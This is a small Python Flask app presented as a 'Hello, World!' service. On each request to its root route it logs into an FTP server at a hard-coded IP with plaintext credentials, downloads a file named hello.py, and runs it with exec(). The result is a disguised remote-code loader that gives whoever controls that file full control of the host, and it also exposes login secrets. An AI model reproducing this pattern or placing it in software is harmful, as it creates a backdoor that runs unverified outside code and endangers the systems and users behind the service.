from flask import Flask
import ftplib
import os
import boto3

app = Flask(__name__)

port = int(os.getenv("PORT"))

@app.route('/')
def hello_world():
    path = 'dow/'
    filename = 'hello.py'
    ftp = ftplib.FTP("31.170.167.199") 
    ftp.login("u454940376", "Timo1234!") 
    ftp.cwd(path)
    ftp.retrbinary("RETR " + filename ,open(filename, 'wb').write)
    ftp.quit()
    exec(open("./hello.py").read())
    return 'Hello, World!'

if __name__ == '__main__':
   app.run(host='0.0.0.0', port=port)
